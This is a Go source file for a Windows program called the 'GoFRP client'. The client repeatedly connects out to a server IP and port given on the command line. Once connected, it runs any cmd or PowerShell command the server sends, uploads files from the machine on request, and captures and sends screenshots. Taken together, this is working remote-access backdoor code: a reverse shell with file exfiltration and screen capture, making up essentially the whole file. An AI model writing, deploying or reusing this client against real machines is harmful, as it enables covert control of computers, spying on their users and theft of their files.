package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"image"
	"image/png"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/kbinani/screenshot"
)

const (
	DefaultServerPort = "2006"
)

var (
	serverIP   = flag.String("server", "", "Server IP address")
	serverPort = flag.String("port", DefaultServerPort, "Server port")
)

func main() {
	flag.Usage = func() {
		fmt.Fprintf(flag.CommandLine.Output(), "Usage: %s -server SERVER_IP [-port PORT]\n", os.Args[0])
		fmt.Println("Example: gofrpclient.exe -server 111.111.111.111 -port 2006")
		fmt.Println("         gofrpclient.exe -server 111.111.111.111")
		flag.PrintDefaults()
	}

	flag.Parse()

	// Check if server IP is provided
	if *serverIP == "" {
		fmt.Println("Error: Server IP address is required")
		flag.Usage()
		os.Exit(1)
	}

	serverAddr := net.JoinHostPort(*serverIP, *serverPort)

	log.Println("GoFRP client is starting...")

	// Loop to try connecting to server
	for {
		err := connectToServer(serverAddr)
		if err != nil {
			log.Printf("Connection to server disconnected or failed: %v", err)
			log.Printf("Will retry connection in %v seconds...", RetryInterval/time.Second)
			time.Sleep(RetryInterval)
		} else {
			log.Println("Server connection closed normally")
		}
	}
}

const (
	RetryInterval = 10 * time.Second
)

func connectToServer(serverAddr string) error {
	// Connect to server
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		return fmt.Errorf("Failed to connect to server %s: %v", serverAddr, err)
	}

	log.Printf("Connected to server: %s", serverAddr)

	// Handle commands from server
	err = handleServerCommands(conn)
	conn.Close()

	return err
}

func handleServerCommands(conn net.Conn) error {
	// Use a buffered channel to handle commands
	commandChan := make(chan string, 100)
	errorChan := make(chan error, 1)

	// Start a goroutine to read commands
	go readServerCommands(conn, commandChan, errorChan)

	// Process commands as they come in
	for {
		select {
		case command, ok := <-commandChan:
			if !ok {
				return nil // Channel closed, normal termination
			}

			// Process the command in a separate goroutine to avoid blocking
			go processCommand(conn, command)

		case err := <-errorChan:
			return err
		}
	}
}

func readServerCommands(conn net.Conn, commandChan chan<- string, errorChan chan<- error) {
	defer close(commandChan)

	reader := bufio.NewReader(conn)
	for {
		// Read command sent by server
		message, err := reader.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				errorChan <- fmt.Errorf("Failed to read server command: %v", err)
				return
			}
			// Normal disconnection
			return
		}

		// Only remove newline characters, keep all other characters
		message = strings.TrimRight(message, "\r\n")
		if message == "" {
			continue
		}

		log.Printf("Received server command: [%s]", message)

		select {
		case commandChan <- message:
		case <-time.After(5 * time.Second):
			log.Println("Warning: Command channel is blocked, dropping command")
		}
	}
}

func processCommand(conn net.Conn, message string) {
	// Help command
	if message == "help" {
		helpText := `Available commands:
  cmd <command>        - Execute a CMD command (e.g., "cmd dir d:\test")
  cmd capture screen   - Take current screenshot and send back
  ps <command>         - Execute a PowerShell command
  help                 - Show this help message

Examples:
  cmd dir d:\test
  cmd capture screen
`
		sendTextResponse(conn, helpText)
		return
	}

	// Exit command - client should disconnect
	if message == "exit" {
		log.Println("Received exit command from server, disconnecting...")
		sendTextResponse(conn, "Client is disconnecting...\n")
		// We'll close the connection by returning an error
		return
	}

	// File sending command: send <filepath>
	if strings.HasPrefix(message, "send ") {
		filePath := strings.TrimPrefix(message, "send ")
		filePath = strings.TrimSpace(filePath)
		log.Printf("Sending file: %s", filePath)
		sendFileToServer(conn, filePath)
		return
	}

	// Special case: screen capture command
	if message == "cmd capture screen" {
		log.Println("Capturing screen...")
		captureScreenAndSend(conn)
		return
	}

	var output []byte
	var cmd *exec.Cmd
	var err error

	// Execute different types of commands based on prefix
	if strings.HasPrefix(message, "cmd ") {
		command := strings.TrimPrefix(message, "cmd ")
		log.Printf("Executing cmd command: [%s]", command)
		// Execute cmd command on Windows
		cmd = exec.Command("cmd", "/C", command)
		output, err = cmd.CombinedOutput()
	} else if strings.HasPrefix(message, "ps ") {
		command := strings.TrimPrefix(message, "ps ")
		log.Printf("Executing ps command: [%s]", command)
		// Execute PowerShell command on Windows
		cmd = exec.Command("powershell", "-Command", command)
		output, err = cmd.CombinedOutput()
	} else {
		// Unknown command
		output = []byte("Unknown command format. Please use 'cmd <command>' or 'ps <command>'\nType 'help' for more information.\n")
		err = nil // Not an execution error, just unknown command
	}

	// Send command output back to server
	sendResponse(conn, output, err)
}

func sendFileToServer(conn net.Conn, filePath string) {
	// Check if file exists
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		errorMsg := fmt.Sprintf("File not found: %s\n", filePath)
		sendTextResponse(conn, errorMsg)
		return
	}

	// Open file
	file, err := os.Open(filePath)
	if err != nil {
		errorMsg := fmt.Sprintf("Failed to open file: %v\n", err)
		sendTextResponse(conn, errorMsg)
		return
	}
	defer file.Close()

	// Get file info
	fileInfo, err := file.Stat()
	if err != nil {
		errorMsg := fmt.Sprintf("Failed to get file info: %v\n", err)
		sendTextResponse(conn, errorMsg)
		return
	}

	fileSize := fileInfo.Size()
	fileName := filepath.Base(filePath)

	// Send file transfer header
	header := fmt.Sprintf("FILE_TRANSFER_START:%s:%d\n", fileName, fileSize)
	_, err = conn.Write([]byte(header))
	if err != nil {
		log.Printf("Failed to send file transfer header: %v", err)
		return
	}

	// Send file content with progress tracking
	buffer := make([]byte, 32768) // 32KB chunks for better performance
	totalSent := int64(0)
	lastProgress := 0
	chunkNumber := 0

	// 添加写入确认机制
	for {
		n, err := file.Read(buffer)
		if err != nil && err != io.EOF {
			errorMsg := fmt.Sprintf("Failed to read file: %v\n", err)
			conn.Write([]byte(fmt.Sprintf("ERROR:%s\n", errorMsg)))
			return
		}
		if n == 0 {
			break
		}

		chunkNumber++

		// Encode chunk as base64
		encoded := base64.StdEncoding.EncodeToString(buffer[:n])

		// 为每个chunk添加序号和长度信息，便于调试和验证
		chunkHeader := fmt.Sprintf("CHUNK:%d:%d:", chunkNumber, len(encoded))
		fullChunk := chunkHeader + encoded + "\n"

		// 发送chunk并检查错误
		_, err = conn.Write([]byte(fullChunk))
		if err != nil {
			log.Printf("Failed to send file chunk %d: %v", chunkNumber, err)
			return
		}

		totalSent += int64(n)

		// Calculate and log progress
		progress := int(float64(totalSent) / float64(fileSize) * 100)
		if progress/10 > lastProgress/10 || progress == 100 {
			log.Printf("File transfer progress: %d%% (%d/%d bytes, chunk: %d)",
				progress, totalSent, fileSize, chunkNumber)
			lastProgress = progress
		}
	}

	// Send end marker
	_, err = conn.Write([]byte("FILE_TRANSFER_END\n"))
	if err != nil {
		log.Printf("Failed to send file transfer end marker: %v", err)
		return
	}

	log.Printf("File sent successfully: %s (%d bytes, %d chunks)",
		fileName, fileSize, chunkNumber)
}
func captureScreenAndSend(conn net.Conn) {
	// Capture actual screen
	img, err := captureScreen()
	if err != nil {
		errorMsg := fmt.Sprintf("Failed to capture screen: %v\n", err)
		sendTextResponse(conn, errorMsg)
		return
	}

	// Encode image to PNG
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		errorMsg := fmt.Sprintf("Failed to encode screenshot: %v\n", err)
		sendTextResponse(conn, errorMsg)
		return
	}

	// Send special header to indicate this is a screenshot
	_, err = conn.Write([]byte("SCREENSHOT_START:" + fmt.Sprintf("%d", buf.Len()) + "\n"))
	if err != nil {
		log.Printf("Failed to send screenshot header: %v", err)
		return
	}

	// Send the image data as base64
	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

	// Split into chunks to avoid large single writes
	chunkSize := 1024
	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}

		_, err = conn.Write([]byte(encoded[i:end] + "\n"))
		if err != nil {
			log.Printf("Failed to send screenshot data: %v", err)
			return
		}
	}

	// Send end marker
	_, err = conn.Write([]byte("SCREENSHOT_END\n---END---\n"))
	if err != nil {
		log.Printf("Failed to send screenshot end marker: %v", err)
		return
	}

	log.Println("Screenshot sent successfully")
}

func captureScreen() (image.Image, error) {
	// Get number of displays
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return nil, fmt.Errorf("no active displays found")
	}

	// Capture primary display (index 0)
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return nil, fmt.Errorf("failed to capture screen: %v", err)
	}

	return img, nil
}

func sendTextResponse(conn net.Conn, text string) {
	lines := strings.Split(text, "\n")
	for _, line := range lines {
		if line != "" {
			_, writeErr := conn.Write([]byte(line + "\n"))
			if writeErr != nil {
				if isConnectionBroken(writeErr) {
					log.Printf("Connection broken: %v", writeErr)
					return
				}
				log.Printf("Failed to send response: %v", writeErr)
				return
			}
		}
	}

	// Send end marker
	_, writeErr := conn.Write([]byte("---END---\n"))
	if writeErr != nil {
		if isConnectionBroken(writeErr) {
			log.Printf("Connection broken: %v", writeErr)
		} else {
			log.Printf("Failed to send end marker: %v", writeErr)
		}
	}
}

func sendResponse(conn net.Conn, output []byte, err error) {
	var response []byte

	if err != nil {
		errorMsg := fmt.Sprintf("Error executing command: %v\n%s", err, string(output))
		// Ensure output is valid UTF-8
		if !utf8.ValidString(errorMsg) {
			errorMsg = fmt.Sprintf("Error executing command: %v\n%s", err, strings.ToValidUTF8(string(output), "?"))
		}
		response = []byte(errorMsg)
	} else {
		// Ensure output is valid UTF-8
		outputStr := string(output)
		if !utf8.ValidString(outputStr) {
			outputStr = strings.ToValidUTF8(outputStr, "?")
		}
		response = []byte(outputStr)
	}

	// Split response into lines and send each line
	lines := strings.Split(string(response), "\n")
	for _, line := range lines {
		if line != "" {
			_, writeErr := conn.Write([]byte(line + "\n"))
			if writeErr != nil {
				// Check if it's a connection broken error
				if isConnectionBroken(writeErr) {
					log.Printf("Connection broken: %v", writeErr)
					return
				}
				log.Printf("Failed to send command output: %v", writeErr)
				return
			}
		}
	}

	// Send end marker
	_, writeErr := conn.Write([]byte("---END---\n"))
	if writeErr != nil {
		// Check if it's a connection broken error
		if isConnectionBroken(writeErr) {
			log.Printf("Connection broken: %v", writeErr)
		} else {
			log.Printf("Failed to send end marker: %v", writeErr)
		}
	}
}

// Check if it's a connection broken error
func isConnectionBroken(err error) bool {
	if err == nil {
		return false
	}
	errStr := err.Error()
	return strings.Contains(errStr, "broken pipe") ||
		strings.Contains(errStr, "connection reset by peer") ||
		strings.Contains(errStr, "closed")
}
